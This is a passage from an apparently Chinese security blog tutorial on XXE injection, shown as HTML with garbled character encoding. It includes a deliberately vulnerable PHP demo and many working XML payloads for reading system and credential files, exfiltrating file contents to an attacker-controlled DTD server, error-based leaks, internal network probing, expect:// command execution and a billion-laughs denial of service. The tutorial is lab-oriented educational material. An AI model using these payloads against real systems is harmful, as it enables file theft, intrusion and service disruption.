class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/windows/win.ini&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--æ–‡æ¡£å…ƒç´ --&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220804155703432-1686034515883.png" alt="image-20220804155703432"></p></li></ul></li></ol><h2 id="DTDä¸å®ä½“"><a href="#DTDä¸å®ä½“" class="headerlink" title="DTDä¸å®ä½“"></a>DTDä¸å®ä½“</h2><h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><blockquote><p>DTDï¼ˆæ–‡æ¡£ç±»å‹å®šä¹‰ï¼‰çš„ä½œç”¨æ˜¯å®šä¹‰ XML æ–‡æ¡£çš„åˆæ³•æ„å»ºæ¨¡å—ã€‚DTD å¯ä»¥åœ¨ XML æ–‡æ¡£å†…å£°æ˜ï¼Œä¹Ÿå¯ä»¥å¤–éƒ¨å¼•ç”¨ã€‚</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY b &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢æ‰€ç¤ºçš„å°±æ˜¯ä¸€ä¸ªDTD</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">    &lt;!ENTITY b system &quot;å¤–éƒ¨dtdåœ°å€&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢æ‰€ç¤ºçš„å°±æ˜¯ä¸€ä¸ªå¤–éƒ¨DTD</p><h3 id="å®ä½“"><a href="#å®ä½“" class="headerlink" title="å®ä½“"></a>å®ä½“</h3><blockquote><p>DTDå®ä½“æ˜¯ç”¨äºå®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ï¼Œå¯ä»¥å†…éƒ¨å£°æ˜æˆ–å¤–éƒ¨å¼•ç”¨ã€‚</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">&lt;!ENTITY hello &quot;hello world&quot; &gt; </span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;foo&gt;&amp;hello&lt;/foo&gt;</span><br></pre></td></tr></table></figure><p>æ–‡æ¡£å…ƒç´ å¯ä»¥ä½¿ç”¨&amp;æ¥å¼•ç”¨å®ä½“çš„å€¼ï¼Œ<code>&amp;hello</code>å°†è¢«æ›¿æ¢ä¸º<code>hello world</code></p><h4 id="å‚æ•°å®ä½“"><a href="#å‚æ•°å®ä½“" class="headerlink" title="å‚æ•°å®ä½“"></a>å‚æ•°å®ä½“</h4><p>XMLå‚æ•°å®ä½“æ˜¯ä¸€ç§ç‰¹æ®Šçš„XMLå®ä½“ï¼Œåªèƒ½åœ¨DTDä¸­çš„å…¶ä»–åœ°æ–¹å¼•ç”¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">&lt;!ENTITY % b &quot;&lt;!ENTITY b1 &quot;awsl&quot;&gt;&quot;&gt;</span><br><span class="line">    %b;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å‚æ•°å®ä½“ç”¨<code>% name</code>å£°æ˜ï¼Œå¼•ç”¨æ—¶ç”¨<code>%name;</code></p><h4 id="å¼•å…¥å¤–éƒ¨å®ä½“"><a href="#å¼•å…¥å¤–éƒ¨å®ä½“" class="headerlink" title="å¼•å…¥å¤–éƒ¨å®ä½“"></a>å¼•å…¥å¤–éƒ¨å®ä½“</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">&lt;!ENTITY ext SYSTEM &quot;file:///path/to/file&quot; &gt; </span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä½¿ç”¨äº†fileåè®®æ¥å¼•å…¥å¤–éƒ¨å®ä½“ï¼Œå®é™…ä¸Šè¿˜èƒ½æ”¯æŒå¦‚ä¸‹åè®®ï¼Œè¿™ä¹Ÿæ˜¯xxeæ¼æ´å½¢æˆçš„åŸå› </p><p><img src="/../images/1270588-20200115235522292-2141935835.png" alt="img"></p><p><img src="/../images/20181120002647-e965b74c-ec17-1.png" alt="20181120002647-e965b74c-ec17-1"></p><h1 id="XXEæ¼æ´"><a href="#XXEæ¼æ´" class="headerlink" title="XXEæ¼æ´"></a>XXEæ¼æ´</h1><h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>XXE æ¼æ´å…¨ç§° XML External Entity Injectionï¼Œå³ xml å¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´</p><h2 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h2><p>XXE æ¼æ´å‘ ç”Ÿåœ¨<strong>åº”ç”¨ç¨‹åºè§£æ XML è¾“å…¥æ—¶</strong>ï¼Œæ²¡æœ‰ç¦æ­¢<strong>å¤–éƒ¨å®ä½“</strong>çš„åŠ è½½ï¼Œè€Œå¤–éƒ¨å®ä½“çš„å¼•ç”¨å¯æ”¯æŒhttpï¼Œfileç­‰åè®®ï¼Œé€šè¿‡åˆ©ç”¨è¿™äº›åè®®è¿›è¡Œæ”»å‡»ã€‚</p><p><img src="/../images/1270588-20200115235522292-2141935835.png" alt="img"></p><p><img src="/../images/20181120002647-e965b74c-ec17-1.png" alt="20181120002647-e965b74c-ec17-1"></p><h2 id="æ¼æ´æ£€æµ‹"><a href="#æ¼æ´æ£€æµ‹" class="headerlink" title="æ¼æ´æ£€æµ‹"></a>æ¼æ´æ£€æµ‹</h2><h3 id="é»‘ç›’"><a href="#é»‘ç›’" class="headerlink" title="é»‘ç›’"></a>é»‘ç›’</h3><ul><li><p>æ•°æ®åŒ…ä¸­çš„content-type</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">application/xml</span><br><span class="line">text/xml</span><br></pre></td></tr></table></figure></li><li><p>http body</p><p><img src="/../images/image-20230605180133052-1686034648311.png" alt="image-20230605180133052"></p></li><li><p>æ•°æ®åŒ…è¯·æ±‚å¤´ä¸­Context-Typeçš„å€¼ä¸ºapplication&#x2F;jsonï¼Œæ›´æ”¹ä¸ºapplication&#x2F;xmlæˆ–è€…text&#x2F;xmlï¼Œç„¶åæ’å…¥payloadæµ‹è¯•</p></li></ul><h3 id="ç™½ç›’"><a href="#ç™½ç›’" class="headerlink" title="ç™½ç›’"></a>ç™½ç›’</h3><h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">simplexml_import_dom</span>()</span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯PHPæ˜¯ä½¿ç”¨libxmlæ¥è§£æXMLçš„ï¼Œä½†æ˜¯<strong>libxml2.9.0</strong>å¼€å§‹å°±é»˜è®¤ä¸è§£æå¤–éƒ¨å®ä½“ï¼Œè‡ªç„¶å°±ä¸å­˜åœ¨xxeæ¼æ´ã€‚</p><h4 id="java"><a href="#java" class="headerlink" title="java"></a>java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">javax.xml.parsers.DocumentBuilder</span><br><span class="line">javax.xml.parsers.SAXParser</span><br><span class="line">javax.xml.parsers.SAXParserFactory</span><br><span class="line">javax.xml.transform.TransformerFactory</span><br><span class="line">javax.xml.validation.Validator</span><br><span class="line">javax.xml.validation.SchemaFactory</span><br><span class="line">javax.xml.transform.sax.SAXTransformerFactory</span><br><span class="line">javax.xml.transform.sax.SAXSource</span><br><span class="line">org.xml.sax.XMLReader</span><br><span class="line">org.xml.sax.helpers.XMLReaderFactory</span><br><span class="line">org.dom4j.io.SAXReader</span><br><span class="line">org.jdom.input.SAXBuilder</span><br><span class="line">org.jdom2.input.SAXBuilder</span><br><span class="line">javax.xml.bind.Unmarshaller</span><br><span class="line">javax.xml.xpath.XpathExpression</span><br><span class="line">javax.xml.stream.XMLStreamReader</span><br><span class="line">org.apache.commons.digester3.Digester</span><br></pre></td></tr></table></figure><h2 id="æ¼æ´å±å®³"><a href="#æ¼æ´å±å®³" class="headerlink" title="æ¼æ´å±å®³"></a>æ¼æ´å±å®³</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ–‡ä»¶è¯»å–</span><br><span class="line">å†…ç½‘æ¢é’ˆ</span><br><span class="line">æ‹’ç»æœåŠ¡æ”»å‡»</span><br><span class="line">å‘½ä»¤æ‰§è¡Œ</span><br></pre></td></tr></table></figure><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><h3 id="å®éªŒç¯å¢ƒ"><a href="#å®éªŒç¯å¢ƒ" class="headerlink" title="å®éªŒç¯å¢ƒ"></a>å®éªŒç¯å¢ƒ</h3><ul><li><a href="https://github.com/c0ny1/xxe-lab">https://github.com/c0ny1/xxe-lab</a> phpç‰ˆæœ¬</li><li>vulhub Apache solr XML å®ä½“æ³¨å…¥æ¼æ´ï¼ˆCVE-2017-12629ï¼‰</li></ul><h3 id="æœ‰å›æ˜¾"><a href="#æœ‰å›æ˜¾" class="headerlink" title="æœ‰å›æ˜¾"></a>æœ‰å›æ˜¾</h3><p>Demo</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line"><span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$creds</span>-&gt;username;</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$creds</span>-&gt;password;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$username</span> == <span class="variable">$USERNAME</span> &amp;&amp; <span class="variable">$password</span> == <span class="variable">$PASSWORD</span>)&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">1</span>,<span class="variable">$username</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">0</span>,<span class="variable">$username</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">3</span>,<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>username</code>ä¸ºå›æ˜¾ä½</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; </span><br><span class="line">]&gt;                                                         </span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="æ— å›æ˜¾"><a href="#æ— å›æ˜¾" class="headerlink" title="æ— å›æ˜¾"></a>æ— å›æ˜¾</h3><h4 id="å¤–å¸¦"><a href="#å¤–å¸¦" class="headerlink" title="å¤–å¸¦"></a>å¤–å¸¦</h4><p>php:&#x2F;&#x2F;filterè¯»å–å¯¹æ–¹æœåŠ¡å™¨æ–‡ä»¶å†…å®¹â†’å¼•å…¥å¤–éƒ¨å®ä½“ï¼ˆæ”»å‡»æœåŠ¡å™¨ä¸Šçš„ï¼‰â†’è§¦å‘å¤–éƒ¨å®ä½“ä¸­çš„å†™å…¥ä»£ç ï¼Œå°†è¯»å–åˆ°çš„æ–‡ä»¶å†…å®¹èµ‹å€¼ç»™æŒ‡å®šå‚æ•°â†’æ¥æ”¶å‚æ•°ï¼Œåœ¨æ”»å‡»æœåŠ¡å™¨ç›‘å¬æˆ–è€…æŸ¥çœ‹æ—¥å¿—ï¼Œä»è€Œè·å–åˆ°å¯¹æ–¹æœåŠ¡å™¨æ–‡ä»¶å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///e:/test.txt&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % dtd SYSTEM &quot;http://ip:8000/test.dtd&quot;&gt;</span><br><span class="line">    %dtd;</span><br><span class="line">    %send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--test.dtd--&gt;</span><br><span class="line">&lt;!ENTITY % payload</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://ip:8888/?data=%file;&#x27;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%payload;</span><br></pre></td></tr></table></figure><blockquote><p>æ³¨æ„ï¼štest.dtdçš„å†…å®¹ï¼Œå†…éƒ¨çš„%å·è¦è¿›è¡Œå®ä½“ç¼–ç æˆ&amp;#x25ï¼ˆå› ä¸ºå®ä½“çš„å€¼ä¸­ä¸èƒ½æœ‰ %, æ‰€ä»¥å°†å…¶è½¬æˆhtmlå®ä½“ç¼–ç  <code>%</code>ï¼‰</p></blockquote><p><img src="/../images/image-20230605192212337.png" alt="image-20230605192212337"></p><h4 id="åŸºäºæŠ¥é”™"><a href="#åŸºäºæŠ¥é”™" class="headerlink" title="åŸºäºæŠ¥é”™"></a>åŸºäºæŠ¥é”™</h4><p>æ„é€ ä¸€ä¸ªé”™è¯¯çš„urlå¹¶å°†æ³„éœ²æ–‡ä»¶å†…å®¹æ”¾åœ¨urlä¸­ï¼Œé€šè¿‡è¿™æ ·çš„æ–¹å¼è¿”å›æ•°æ®ã€‚</p><h5 id="å¼•å…¥æœåŠ¡å™¨å®ä½“"><a href="#å¼•å…¥æœåŠ¡å™¨å®ä½“" class="headerlink" title="å¼•å…¥æœåŠ¡å™¨å®ä½“"></a>å¼•å…¥æœåŠ¡å™¨å®ä½“</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY % xxe SYSTEM &quot;http://ip:8000/xml.dtd&quot;&gt; </span><br><span class="line">    %xxe;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>xml.dtd</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--é€šè¿‡æ‰§è¡Œerrorå®ä½“ï¼Œä»¥ä¾¿é€šè¿‡å°è¯•åŠ è½½ä¸å­˜åœ¨çš„æ–‡ä»¶æ¥å¸¦å‡ºç›®æ ‡æ–‡ä»¶çš„å€¼ï¼Œä»è€Œç”ŸæˆåŒ…å«ä¸å­˜åœ¨æ–‡ä»¶çš„åç§°çš„é”™è¯¯æ¶ˆæ¯ï¼Œè¯¥æ–‡ä»¶æ˜¯/etc/passwdæ–‡ä»¶çš„å†…å®¹--&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#x27;file:///nonexistent/%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%error;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230606142023880.png" alt="image-20230606142023880"></p><h5 id="å¼•å…¥æœ¬åœ°ç³»ç»Ÿæ–‡ä»¶â€“æµ‹è¯•å¤±è´¥"><a href="#å¼•å…¥æœ¬åœ°ç³»ç»Ÿæ–‡ä»¶â€“æµ‹è¯•å¤±è´¥" class="headerlink" title="å¼•å…¥æœ¬åœ°ç³»ç»Ÿæ–‡ä»¶â€“æµ‹è¯•å¤±è´¥"></a>å¼•å…¥æœ¬åœ°ç³»ç»Ÿæ–‡ä»¶â€“æµ‹è¯•å¤±è´¥</h5><p><a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/">https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///C:/Windows/System32/wbem/xml/cim20.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % SuperClass &#x27;</span><br><span class="line">         &gt;Your DTD code&lt;!ENTITY test &quot;test&quot;</span><br><span class="line">        &#x27;&gt;</span><br><span class="line">    %local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>DTD code</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;error;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///C:/Windows/System32/wbem/xml/cim20.dtd&quot;&gt;</span><br><span class="line">        &lt;!ENTITY % SuperClass &#x27;&gt;</span><br><span class="line">         &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;error; &lt;!ENTITY test &quot;test&quot;</span><br><span class="line">        &#x27;&gt;</span><br><span class="line">    %local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><h5 id="åµŒå¥—å‚æ•°å®ä½“"><a href="#åµŒå¥—å‚æ•°å®ä½“" class="headerlink" title="åµŒå¥—å‚æ•°å®ä½“"></a>åµŒå¥—å‚æ•°å®ä½“</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ELEMENT message ANY&gt;</span><br><span class="line">    &lt;!ENTITY % para1 SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % para &#x27;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;para2;</span><br><span class="line">    &#x27;&gt;</span><br><span class="line">    %para;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230605210541295.png" alt="image-20230605210541295"></p><p>ä¸æ˜¯æ‰€æœ‰çš„xmlè§£æå™¨éƒ½èƒ½è§£æåµŒå¥—å‚æ•°å®ä½“</p><p><img src="/../images/image-20230606151226408.png" alt="image-20230606151226408"></p><h3 id="åˆ©ç”¨æ–¹å¼"><a href="#åˆ©ç”¨æ–¹å¼" class="headerlink" title="åˆ©ç”¨æ–¹å¼"></a>åˆ©ç”¨æ–¹å¼</h3><h4 id="æ–‡ä»¶è¯»å–"><a href="#æ–‡ä»¶è¯»å–" class="headerlink" title="æ–‡ä»¶è¯»å–"></a>æ–‡ä»¶è¯»å–</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;        </span><br><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">&lt;!ENTITY rabbit SYSTEM &quot;file:///æ–‡ä»¶è·¯å¾„&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!-- ä½¿ç”¨phpçš„filterè¿‡æ»¤å™¨è¯»å–å«æœ‰xmlä¿ç•™å­—ç¬¦çš„æ–‡ä»¶ --&gt;</span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">&lt;!ENTITY  rabbit SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///e:/test.txt&quot;&gt;]&gt; </span><br><span class="line"></span><br><span class="line">&lt;firstname&gt;&amp;rabbit;&lt;/firstname&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230605193428910.png" alt="image-20230605193428910"></p><p>å½“ä¸èƒ½ä½¿ç”¨è¿‡æ»¤å™¨æ—¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   </span><br><span class="line">&lt;!ENTITY % goodies SYSTEM &quot;file:///f:/test.txt&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; </span><br><span class="line">%dtd; ]&gt; </span><br></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure><p>POSTæ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- &amp;allæ˜¯ä½¿ç”¨evil.dtdä¸­çš„å®ä½“--&gt;</span><br><span class="line">&lt;roottag&gt;&amp;all;&lt;/roottag&gt;  </span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230605204320348.png" alt="image-20230605204320348"></p><h4 id="åˆ—ç›®å½•â€“JAVA"><a href="#åˆ—ç›®å½•â€“JAVA" class="headerlink" title="åˆ—ç›®å½•â€“JAVA"></a>åˆ—ç›®å½•â€“JAVA</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- Root / --&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE aa[</span><br><span class="line">    &lt;!ELEMENT bb ANY&gt;</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:///&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230607100242865.png" alt="image-20230607100242865"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- Root / --&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE aa[</span><br><span class="line">    &lt;!ELEMENT bb ANY&gt;</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;netdoc:///&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure><h4 id="å†…ç½‘æ¢é’ˆ"><a href="#å†…ç½‘æ¢é’ˆ" class="headerlink" title="å†…ç½‘æ¢é’ˆ"></a>å†…ç½‘æ¢é’ˆ</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;        </span><br><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY rabbit SYSTEM &quot;http://å†…ç½‘ip:port&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;firstname&gt;&amp;rabbit;&lt;/firstname&gt;</span><br></pre></td></tr></table></figure><h4 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h4><blockquote><p>è¯¥ CASE æ˜¯åœ¨å®‰è£… expect æ‰©å±•çš„ PHP ç¯å¢ƒé‡Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;expect://å‘½ä»¤&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure><h4 id="DOSæ”»å‡»"><a href="#DOSæ”»å‡»" class="headerlink" title="DOSæ”»å‡»"></a>DOSæ”»å‡»</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE lolz [  &lt;!ENTITY lol &quot;lol&quot;&gt;  &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;  &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;  &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;  &lt;!ENTITY lol5 